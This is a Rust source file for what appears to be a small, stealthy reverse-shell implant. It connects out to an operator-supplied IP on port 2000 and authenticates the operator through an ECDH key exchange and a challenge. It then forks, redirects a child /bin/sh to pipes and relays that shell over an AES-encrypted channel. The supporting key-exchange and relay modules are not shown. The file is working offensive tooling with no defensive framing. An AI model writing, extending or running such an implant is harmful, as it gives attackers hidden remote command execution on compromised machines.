#![cfg_attr(not(test), no_main)]
#![feature(trait_alias)]

extern crate libc;
mod auxv;
mod kex;
mod relay;
pub mod util;

#[allow(unused_imports)]
use aes_gcm::{Aes256Gcm, Key, Nonce};
#[allow(unused_imports)]
use anyhow::{anyhow, Result};
use auxv::getauxval;
use base64ct::{Base64, Encoding};
use kex::{play_auth_challenge_remote, play_dh_kex_remote};
use p256::PublicKey;
use rand_chacha::ChaCha20Rng;
use rand_core::SeedableRng;
use relay::{relay, RelayNode};
use std::ffi::{c_char, CStr};
use std::net::{Ipv4Addr, SocketAddr, TcpStream};
use std::os::unix::io::AsRawFd;
use util::debug;

const LOCAL_PORT: u16 = 2000;

fn get_rand_seed(rand_ptr: *const u64) -> Option<u64> {
	if 0 != rand_ptr as usize {
		// Assuming everything worked out correctly, this dereference
		// should be fine
		debug!("deref rand bytes at: {:#016x}", rand_ptr as usize);
		let result = unsafe { *(rand_ptr) };
		debug!("= {:#016x}", result);
		Some(result)
	} else {
		// getauxval(AT_RANDOM) is not available, use /dev/urandom
		None
	}
}

// The ecdh library expects the PEM in a certain format
//  use this function to convert from straight b64 to
//  the expected format.
fn format_public_key(b64_sec1: &str) -> ([u8; 1024], usize) {
	let mut rebuilt = [0u8; 1024];
	let size = {
		let s = Base64::decode(b64_sec1, &mut rebuilt).unwrap();
		s.len()
	};
	(rebuilt, size)
}

#[cfg_attr(not(test), no_mangle)]
pub fn main(
	argc: i32,
	argv: *const *const u8,
	envp: *const *const u8,
) -> i8 {
	// Check that we have the args
	if argc < 3 {
		return 1;
	}

	// Parse argv
	let argv_ptrs =
		unsafe { std::slice::from_raw_parts(argv, argc as usize) };
	let ip_str = unsafe {
		CStr::from_ptr(argv_ptrs[1] as *const c_char)
			.to_str()
			.unwrap()
	};
	let key_str = unsafe {
		CStr::from_ptr(argv_ptrs[2] as *const c_char)
			.to_str()
			.unwrap()
	};
	// Parse the IP
	let ipaddr_l: Ipv4Addr =
		ip_str.parse().expect("Failed to parse IP");
	// Parse the public key which should just be the base64 component
	//  on a single line
	let (rebuilt, rebuilt_sz) = format_public_key(&key_str);
	let pub_l = PublicKey::from_sec1_bytes(&rebuilt[..rebuilt_sz])
		.expect("Failed to parse public key");

	debug!(
		"Found local's key:\n{:?}\nAnd address: {:#}",
		pub_l, ipaddr_l,
	);

	// Seed the RNG
	// Prefer the auxiliary vector's random data entry for seeding
	let rand_ptr =
		getauxval(envp, libc::AT_RANDOM as usize) as *const u64;
	let seed1 = get_rand_seed(rand_ptr);

	// TODO: Register SIGALRM

	// Open the socket to remote
	let addr = SocketAddr::from((ipaddr_l, LOCAL_PORT));
	let mut remote =
		TcpStream::connect(addr).expect("Unable to connect.");
	// Get the shared AES key
	let key = play_dh_kex_remote(&mut remote, &pub_l, seed1)
		.expect("Failed KEX");
	//todo!();

	// Create a new rng for the challenge and nonce values
	let mut rng = if let Some(seed2) =
		get_rand_seed(unsafe { rand_ptr.add(1) })
	{
		ChaCha20Rng::seed_from_u64(seed2)
	} else {
		debug!("Unable to use seeds, using /dev/urandom");
		ChaCha20Rng::from_entropy()
	};

	// Challenge the remote
	play_auth_challenge_remote(&mut remote, &pub_l, &mut rng)
		.expect("Failed challenge");

	// TODO: unregister SIGALRM

	// Make some pipes
	let (pipein_parent, pipein_child) =
		os_pipe::pipe().expect("Failed to open pipes");
	let (pipeout_child, pipeout_parent) =
		os_pipe::pipe().expect("Failed to open pipes");
	match unsafe { libc::fork() } {
		-1 => panic!("Unable to fork"),
		0 => {
			// Child:
			//  - close fds (except _child pipes) get the max fd value
			let fdmax: i32 =
				unsafe { libc::sysconf(libc::_SC_OPEN_MAX) }
					.try_into()
					.unwrap_or(i16::MAX.into());
			//    convert to integers instead of rust files
			let (fd0, fd1) =
				(pipeout_child.as_raw_fd(), pipein_child.as_raw_fd());
			//    close everything
			for fd in 0i32..fdmax {
				if fd != fd0 && fd != fd1 {
					unsafe { libc::close(fd) };
				}
			}
			//  - dup2
			if 0 > unsafe { libc::dup2(fd0, 0) } {
				panic!("Unable to dup2");
			}
			if 0 > unsafe { libc::dup2(fd1, 1) }
				|| 0 > unsafe { libc::dup2(fd1, 2) }
			{
				panic!("Unable to dup2");
			}
			//  - setup /bin/sh command
			let sh = b"/bin/sh\0";
			let mut argv_ptr = [0 as *const i8; 2];
			argv_ptr[0] = sh.as_ptr() as *const i8;
			//  - tty?
			//  - exec
			unsafe {
				libc::execv(
					sh.as_ptr() as *const i8,
					argv_ptr.as_ptr(),
				)
			};
		}
		_ => {
			// Start up the relay
			let mut node1 = RelayNode {
				readable: pipein_parent,
				writeable: pipeout_parent,
			};
			relay(&mut node1, &mut remote, &key, &mut rng)
				.expect("Finished relay");
		}
	};
	return 0;
}
